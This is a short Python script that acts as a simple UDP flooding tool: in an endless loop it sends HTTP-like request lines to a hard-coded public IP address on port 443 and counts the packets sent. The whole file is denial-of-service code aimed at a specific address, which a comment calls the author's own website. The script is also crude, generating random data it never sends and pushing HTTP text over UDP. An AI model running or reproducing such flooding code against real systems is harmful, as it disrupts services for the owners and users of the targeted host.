import socket
import random


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Creating socket
bytes = random._urandom(1490)  #Generating random bytes of data


ip = '211.249.222.33' #My website IP
port = 443 #HTTPS Default port
sent = 0

#The infinite loop
while True:
     sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
     sock.sendto(("Host: Vitoria"  + "\r\n\r\n").encode('ascii'), (ip, port))
     sent = sent + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    
